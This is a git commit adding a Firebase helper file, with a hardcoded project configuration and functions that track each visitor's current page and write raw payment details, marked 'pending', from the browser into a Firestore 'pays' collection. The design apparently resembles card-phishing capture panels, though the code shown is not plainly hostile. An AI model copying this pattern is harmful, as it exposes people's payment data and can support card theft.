7d0887506c47c3b63a9a70df3433810645c74eca
clieantapp-crypto <clieantapp@gmail.com>
2025-07-22 20:21:46 +0300

    VBCC

---
+++ lib/firebase.ts
@@ -0,0 +1,55 @@
+// firebase.js
+import { getApp, getApps, initializeApp } from 'firebase/app';
+import { getDatabase } from 'firebase/database';
+import { doc, getFirestore, setDoc } from 'firebase/firestore';
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDp_uI4zO6I3D5h8G1MK1bCAjIqH8prbJc",
+  authDomain: "tamins-86ba3.firebaseapp.com",
+  projectId: "tamins-86ba3",
+  storageBucket: "tamins-86ba3.firebasestorage.app",
+  messagingSenderId: "952748602321",
+  appId: "1:952748602321:web:04ef672e0d44b70d5566f0",
+  measurementId: "G-EB2WJPP7FP"
+};
+
+const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+const db = getFirestore(app);
+const database = getDatabase(app);
+
+export async function addData(data: any) {
+  localStorage.setItem('visitor', data.id);
+  try {
+    const docRef = await doc(db, 'pays', data.id!);
+    await setDoc(docRef,   { ...data, createdDate: new Date().toISOString() },{merge:true});
+
+    console.log('Document written with ID: ', docRef.id);
+    // You might want to show a success message to the user here
+  } catch (e) {
+    console.error('Error adding document: ', e);
+    // You might want to show an error message to the user here
+  }
+}
+
+export const handleCurrentPage=(page:string)=>{
+const visitorId=localStorage.getItem('visitor')
+addData({id:visitorId,currentPage:page})
+}
+export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
+  try {
+    const visitorId = localStorage.getItem('visitor');
+    if (visitorId) {
+      const docRef = doc(db, 'pays', visitorId);
+      await setDoc(
+        docRef,
+        { ...paymentInfo, status: 'pending' },
+        { merge: true }
+      );
+      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
+    }
+  } catch (error) {
+    console.error('Error adding document: ', error);
+    alert('Error adding payment info to Firestore');
+  }
+};
+export { db,database };
